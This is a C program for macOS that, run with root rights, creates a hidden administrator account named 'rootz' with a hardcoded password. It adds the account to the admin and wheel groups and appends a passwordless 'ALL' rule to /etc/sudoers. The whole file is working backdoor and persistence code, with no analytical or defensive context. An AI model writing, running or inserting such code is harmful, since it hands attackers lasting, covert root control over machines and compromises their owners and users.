#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

int main() {
    setuid(0);  // Gain root privileges

    const char *username = "rootz";
    const char *password = "root123";
    const char *tmp_sudoers = "/tmp/sudoers_tmp";
    char cmd[512];

    // Create user
    snprintf(cmd, sizeof(cmd), "/usr/bin/dscl . -create /Users/%s", username);
    system(cmd);

    snprintf(cmd, sizeof(cmd), "/usr/bin/dscl . -create /Users/%s UserShell /bin/bash", username);
    system(cmd);

    snprintf(cmd, sizeof(cmd), "/usr/bin/dscl . -create /Users/%s NFSHomeDirectory /Users/%s", username, username);
    system(cmd);

    snprintf(cmd, sizeof(cmd), "/usr/bin/dscl . -create /Users/%s UniqueID 505", username);  // Adjust as needed
    system(cmd);

    snprintf(cmd, sizeof(cmd), "/usr/bin/dscl . -create /Users/%s PrimaryGroupID 20", username);
    system(cmd);

    snprintf(cmd, sizeof(cmd), "/usr/bin/dscl . -passwd /Users/%s %s", username, password);
    system(cmd);

    snprintf(cmd, sizeof(cmd), "/bin/mkdir -p /Users/%s && /usr/sbin/chown %s /Users/%s", username, username, username);
    system(cmd);

    // Add to admin group
    snprintf(cmd, sizeof(cmd), "/usr/sbin/dseditgroup -o edit -a %s -t user admin", username);
    system(cmd);

    // Add to wheel group
    snprintf(cmd, sizeof(cmd), "/usr/sbin/dseditgroup -o edit -a %s -t user wheel", username);
    system(cmd);

    // Give passwordless sudo
    FILE *fp = fopen(tmp_sudoers, "w");
    if (!fp) {
        perror("Cannot open sudoers temp file");
        return 1;
    }

    fprintf(fp, "%s ALL=(ALL) NOPASSWD: ALL\n", username);
    fclose(fp);

    snprintf(cmd, sizeof(cmd), "cat %s >> /etc/sudoers", tmp_sudoers);
    system(cmd);

    snprintf(cmd, sizeof(cmd), "rm -f %s", tmp_sudoers);
    system(cmd);

    printf("User '%s' created with admin, wheel group membership and passwordless sudo.\n", username);
    return 0;
}
